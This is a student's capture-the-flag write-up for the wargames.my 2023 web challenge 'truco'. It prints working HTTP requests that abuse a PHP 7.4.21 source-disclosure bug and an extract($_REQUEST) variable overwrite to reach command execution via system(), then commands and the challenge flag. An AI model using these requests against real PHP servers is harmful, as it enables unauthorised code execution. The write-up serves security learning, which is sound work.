---
title:  "wargames.my 2023 (Student Category) - Writeup (Web Exploitation - truco)"
date:   2023-12-17 02:53:58 +0800
categories: [CTF Writeup, Web Exploitation]
tags: [wargames.my 2023]
---
Here is a bit of writeup produced here.

## The Problem

There were no source code provided only url are given. The url consist of this page:

![](/assets/img/image1.png)

This is the only source code given during this challenge.

Here are the steps I've taken in this challenge (including mistaken route :( )

## Step 1 (Initial Analysis)

First, I take a look what could be found here. Since the source code are given, we will analyse the code given until we reached the flag.

(1): The code retrieve the variable `$a` and `$b` persume from the URL Query.

(2): The code checks the `URL Query Params` if match the given REGEX which is to fulfill `?a=notnull`.

(3): The code then check for `$num` (which we don't know where to obtain) based on REGEX as well (`only wants the first letter not to match any of symbols given`

(4): Then, comes the crucial part. `$a`is checked if the variable is **NULL** (seems fishy here) and `$num` contains numeric string.

(5): If this satisfied, the code will echo the flag.

TO NOTE: this code also contains `include 'flag.php'` which where this code obtain its `$flag` variable.

## Step 2 (Obtaining Source Code)

I've taken initiative to learn every single text available here. Here I've decided to learn better how to obtain access to `flag.php` so that I can bypass the checks.

I've launched Burp Suite and started analysis the backend.

![](/assets/img/image2.png)

From the response, we can take a look at its PHP version `7.4.21`. Since, there is no way to do LFI (Local File Inclusion), I've searched the internet if we could see a bug in this version. Suprisingly, I've found one that allows us to obtain server code here.

Based from the web "[https://blog.projectdiscovery.io/php-http-server-source-disclosure/](https://blog.projectdiscovery.io/php-http-server-source-disclosure/)", you can manipulate the internal server code to force publish the php code. This bug is fixed on later releases `PHP 7.4.22+`.

The code used are:

```
GET /flag.php HTTP/1.1
Host: <challenge ip>

GET /xyz.xyz HTTP/1.1
```

Here we see, the first tries to obtain the source code but the second one points to a non-existant path which cause the PHP server to send the code not excute it.

![](/assets/img/image3.png)

Then, we repeat this process until we've obtained all the code.

index.php

```php
<?php
include "flag.php";
highlight_file(__FILE__); 
error_reporting(0); 

$a = $_GET['a'];
$b = $_GET['b'];

if(!preg_match("/\?a=notnull/i", $_SERVER['REQUEST_URI'])){
    exit("<h2>Oops :(<h2>");
}

if(preg_match("/^[0-9+-\/\*e ]/i", $num)){
    exit("<h2>Oops Oops :(<h2>");
}

if (is_null($a)){
    if (is_numeric($num)){
        echo $flag;
    }
    else{
        echo "<h2>No flag for you yet :P<h2>";
    }
}else{
    echo "<h2>No flag for you :P<h2>";
}
?>
```
{: file='index.php'}

flag.php

```php
<?php

$flag="flag{fakeflag_dontsubmit}";

if(in_array($_REQUEST['func'], ['is_string','is_null','is_numeric'])){
    include "secret.php";
    echo $_POST['func']($value);
}

?>
```
{: file='flag.php'}

From the flag.php, we can see that the file imported another PHP file which is `secret.php`. We've also obtained the code as well.

secret.php

```php
<?php
extract($_REQUEST);
?>
```
{: file='secret.php'}

## Step 3 (Full Source Code Analysis)

After we've obtained the code, we start the overall code analysis.

From the `flag.php`, we've seen that we shouldn't attempt on retrieving the flag because the flag is a fake flag

```php
...
$flag="flag{fakeflag_dontsubmit}";
...
```
{: file='flag.php'}

This is where is my mistake, I first thought that the flag is generated on the server then replacing this fake flag. So, I've completed on passing every check only to know that I've obtained again the fake flag (not written here tho). From here, I've proceed on bypassing everything on the `index.php` file.

Apart from that, other interesting here is the `echo $_POST['func']($value);`. This line shows that we could achieve RCE (Remove Code Execution) and run server-side code from here. Plus, we don't need to search ways to get it to output the code since `echo` is here which causes us to find a PHP code that can give direct output. But, there is a check in place for the `func` attribute.

`if(in_array($_REQUEST['func'], ['is_string','is_null','is_numeric']))`

At first glance, we could think that `$_REQUEST['func']` is the same as `$_GET['func']` and `$_POST['func']`. Therefore, it is quite impossible to run this.

Here is the part where we enter `secret.php` file. This line is important in our explotation here.
```php
...
extract($_REQUEST);
...
```
{: file='secret.php'}


The `extract` function changes an array to become the variable in PHP for ex. `{"var1": "data1"} => $var1 = "data1"`. This function will also override any variable created before.

Here it takes `$_REQUEST` variable to be exposed into the PHP code. This can cause leaking of information and also override variable in place. Please do use this `extract` function with checks and caution!

Here we can take our first step, we can use `$_REQUEST` to modify the `$_POST['func']` we talked earlier to run server-side code.

## Step 4 (Exploitation)

From here, we can start to craft the `GET` request to allow this exploitation to work. The request is as follows:

```
GET /index.php?func=is_string&value=echo%20"Hello"&_POST[func]=system HTTP/1.1
Host: <challenge ip>

```

Here we see that, we've send `?func=is_string&value=echo%20"Hello"&_POST[func]=system` as URL arguments that will fill the `$_REQUEST` later. I've set `func=is_string` to fulfill the checks we've mentioned earlier.

This part `value=echo%20"Hello"&_POST[func]=system` is used to override `$_POST[func]` when we are running code later on. We'll be using `system` to run bash code on the server. We need to use this as this PHP code can give the direct output and allows use to use the `echo`. As an example to see the code runs, we just set `value=echo%20"Hello"` as a proof of concept.

![](/assets/img/image4.png)

Now we have see the `Hello` text appearing on our response. We have successfully obtain the permission to run server-side code. hehe

## Step 5 (Finding the flag)

Now that, we have the access to the server. We can start searching for the flag. For `Web Challenges/Exploitation`, it is normal to find flag in `flag.txt`. For this, we will be using `find` command to find any match. The command use is as follows:
```bash
find / -name "flag.*"
```

In order to properly send this, we need to URL-Encode this before sending. This value will be on the `value` params of our `GET` request.

![](/assets/img/image5.png)

```bash
/var/www/html/flag.php
/flag.txt
```

After sending our request, we see that there is a `flag.txt` file on the root of our server. From here, simply use `cat` command to obtain this flag. Replace the `value` parameter to `cat /flag.txt`. Remember to URL Encode this as well.

![](/assets/img/image6.png)

With that, we've obtained the flag `wgmy{b7030e464dfc7ff1c899b89025699e1b}`.

## Closing

Trust me, I've learned a lot from this one. It was an enjoying one to be able to solve my first CTF problems. May we meet in another CTF. Bye bye and Happy Hacking everyone!
